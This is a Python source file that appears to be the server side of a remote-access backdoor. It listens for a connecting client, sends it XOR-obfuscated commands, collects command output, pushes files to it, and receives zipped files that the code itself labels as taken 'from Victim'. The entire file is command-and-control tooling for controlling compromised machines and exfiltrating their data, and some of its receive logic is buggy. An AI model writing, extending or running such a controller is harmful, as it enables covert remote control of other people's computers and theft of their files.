import socket
from itertools import cycle
import base64

DSIZE = 102400 # Data Size
DELIMETER = "<END_OF_RESULTS>"

class ServerConnection :
    def __init__(self):
        """Create TCP Socket
        """
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
    def CreateConnection(self, ip, port) :
        self.server_ip = ip
        self.server_port = port
        
        self.socket.bind((self.server_ip,self.server_port))
    
    def Listen(self , noc): # noc = Number Of Connections
        self.socket.listen(noc)
        
    def AcceptConnection(self):
        self.client_conn , self.client_add = self.socket.accept()
        return (self.client_conn , self.client_add)
    
    def send_data(self , cmd):
        # self.client_conn.send(cmd.encode('utf-8'))
        encry = self.encryptDecrypt(cmd,encode=True)
        self.client_conn.send(encry)
        
    def recv_data(self):
        data = self.client_conn.recv(DSIZE)
        self.data = data.decode('utf-8')
        self.data = self.encryptDecrypt(self.data)
        return self.data
    
    def receive_result(self):
         print("[+] Getting Command Results")  
         result = b''
         while True:
             chunk = self.client_conn.recv(DSIZE)
             if chunk.endswith(DELIMETER.encode()):
                 chunk += chunk[:-len(DELIMETER)]
                 result += chunk
                 break
             result += chunk
             
         l = (result.decode()).find(DELIMETER)
         self.data = result.decode()[:l]
         print(" ")
         return (self.data)    
        
    def send_results(self,command_result):
         data_to_send = command_result + DELIMETER
         datainbytes = data_to_send.encode("utf-8")
         self.socket.sendall(datainbytes)
     
    def send_file(self , filename):
         print("[+] Sending File")
         with open(filename, 'rb') as file :
             chunk = file.read(DSIZE)
             while len(chunk) > 0:
                 self.client_conn.send(chunk)
                 chunk = file.read(DSIZE)
             self.client_conn.send(DELIMETER.encode())
    
    def receive_zipped(self,zipped_file):
         print(f"[+] Receiving {zipped_file} from Victim")
         
         full_file=b''
         while True :
             chunk = self.client_conn.recv(DSIZE)
             if chunk.endswith(DELIMETER.encode()):
                 chunk += chunk[:-len(DELIMETER)]
                 full_file += chunk
                 break
             full_file += chunk
        
         
         print("[+] Bytes Received")
         
         with open(zipped_file,'wb') as file:
                 file.write(full_file)
         print ("[+] Received Successfully")

    # def encryptDecrypt(self,inpString):
    #      xorKey = 'J'
      
    #      length = len(inpString) 
      
    #      for i in range(length): 
            
    #         inpString = (inpString[:i] + 
    #               chr(ord(inpString[i]) ^ ord(xorKey)) +
    #                        inpString[i + 1:]) 
    #         print(inpString[i], end = "") 
            
    #      return inpString
    def encryptDecrypt(self,data, key = 'test', encode = False, decode = False):
        
        xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
         
        if encode:
           return xored.encode('utf-8')
        return xored

    
    def end_conn(self):
        self.client_conn.close()
        self.socket.close()
